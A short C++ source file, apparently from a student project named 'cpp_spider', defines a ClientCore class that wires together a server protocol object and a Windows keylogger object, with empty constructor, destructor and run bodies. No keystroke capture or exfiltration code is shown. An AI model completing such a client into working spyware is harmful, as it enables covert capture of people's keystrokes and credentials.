/*
** ClientCore.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/ClientCore.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 10:59:44 2017 Maxime PILLON
** Last update Thu Oct 05 10:59:44 2017 Maxime PILLON
*/

#include <Protocol/ServerProtocol.hpp>
#include <WindowsKeyLogger.hpp>
#include "ClientCore.hpp"

spider::ClientCore::ClientCore() : _proto(spider::ServerProtocol()),
				   _keylogger(spider::WindowsKeyLogger())
{}

spider::ClientCore::~ClientCore()
{}

void spider::ClientCore::run()
{}